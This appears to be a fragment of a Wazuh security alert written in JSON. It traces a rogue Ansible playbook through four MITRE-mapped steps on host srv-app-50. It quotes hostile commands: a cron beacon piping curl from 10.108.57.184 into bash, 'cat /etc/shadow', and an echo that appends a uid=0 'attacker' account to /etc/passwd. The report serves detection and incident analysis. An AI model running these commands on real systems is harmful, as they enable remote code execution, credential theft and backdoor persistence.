  "attack_progression": [
    {"step": 1, "tactic": "Execution / Scheduled Task or Job", "technique": "T1072", "what_happened": "At 2026-05-13 02:11:07 CEST, Wazuh FIM (syscheck) recorded the creation of a new YAML file /tmp/ansible_deploy_20260513_021107.yml on Linux host srv-app-50 (agent 10.108.57.50). The file content is an Ansible playbook with hosts:all + become:true + gather_facts:false and a task list that includes a get_url download of a second-stage script from http://10.108.57.184/stg2.sh, a shell task executing that stager, a shell task reading /etc/shadow, and a cron module task installing a */5 cron job for root that beacons 'curl -s http://10.108.57.184/beacon.sh | bash'. The off-hours timestamp (02:11 local) and the /tmp authoring location are both anomalous for legitimate change-managed automation.", "chain_reason": "syscheck.path matched /tmp/ansible_deploy_*.yml and syscheck.event=added; the Wazuh rule that fired is tagged software-deployment-tools / T1072 because the file is a parseable Ansible playbook written outside any sanctioned automation directory.", "first_seen": "2026-05-13T02:11:07+0200"},
    {"step": 2, "tactic": "Execution / Software Deployment Tools", "technique": "T1072", "what_happened": "Between 02:12:40 and 02:14:55 CEST, host srv-app-50 logged inbound SSH authentication events whose source address is data.srcip=10.108.57.184 — an IP that is NOT the sanctioned Ansible control node (the CMDB-registered controller is 10.108.57.12). The SSH sessions targeted the root account. Within seconds of each SSH connection, Linux auditd recorded execve events on srv-app-50 for /usr/bin/python3 invoked with a long base64-style argument — the canonical Ansible bootstrap shim that the controller pushes to managed hosts to run modules. The pairing of 'SSH from an unrecognised controller IP' + 'python3 bootstrap execve seconds later' is the literal signature of an Ansible play executed from an unknown controller.", "chain_reason": "Wazuh rule 92792 'Ansible playbook run from unknown controller IP' correlated data.srcip=10.108.57.184 SSH auth on srv-app-50 with auditd data.audit.exe=/usr/bin/python3 execve carrying a base64 argument, where the source IP is absent from the sanctioned-controller allow-list. MITRE T1072 attached automatically.", "first_seen": "2026-05-13T02:12:40+0200"},
    {"step": 3, "tactic": "Credential Access / Privilege Escalation probe", "technique": "T1003.008", "what_happened": "At 02:15:48 CEST, auditd on srv-app-50 recorded an execve of /usr/bin/cat with the command line 'cat /etc/shadow' executed under uid=0 — invoked by the Ansible 'command' module via --become, immediately after the python3 bootstrap shim. A second auditd execve at 02:16:20 shows a shell append redirect adding a uid=0 line to /etc/passwd ('echo attacker:x:0:0::/root:/bin/bash >> /etc/passwd'). Both are direct privilege-escalation / credential-access actions driven by the rogue Ansible play, not interactive operator activity.", "chain_reason": "Wazuh rule 92793 'Ansible privilege escalation attempt' fired on auditd data.audit.command containing 'cat /etc/shadow' with data.audit.uid=0, parented by the same python3 bootstrap process tree as step 2. MITRE T1003.008 (/etc/passwd and /etc/shadow) attached.", "first_seen": "2026-05-13T02:15:48+0200"},
    {"step": 4, "tactic": "Persistence-adjacent Execution / Cron", "technique": "T1053.003", "what_happened": "The rogue playbook's final task uses the Ansible cron module to install a root crontab entry '*/5 * * * * curl -s http://10.108.57.184/beacon.sh | bash'. If the play completed this task on srv-app-50, the host now has a recurring 5-minute beacon to the unknown controller IP — converting a one-shot remote-exec into scheduled, unattended C2. This is the Scheduled Task / Job (Cron) tail of the Software Deployment Tools abuse chain and the reason the alert is rated critical rather than high.", "chain_reason": "The playbook file content captured by FIM in step 1 contains an explicit cron module task; correlation flagged the /tmp playbook + the cron job string + the same external IP 10.108.57.184 as a single chained intrusion. MITRE T1053.003 (Cron) attached as the persistence-adjacent execution tail.", "first_seen": "2026-05-13T02:17:02+0200"}
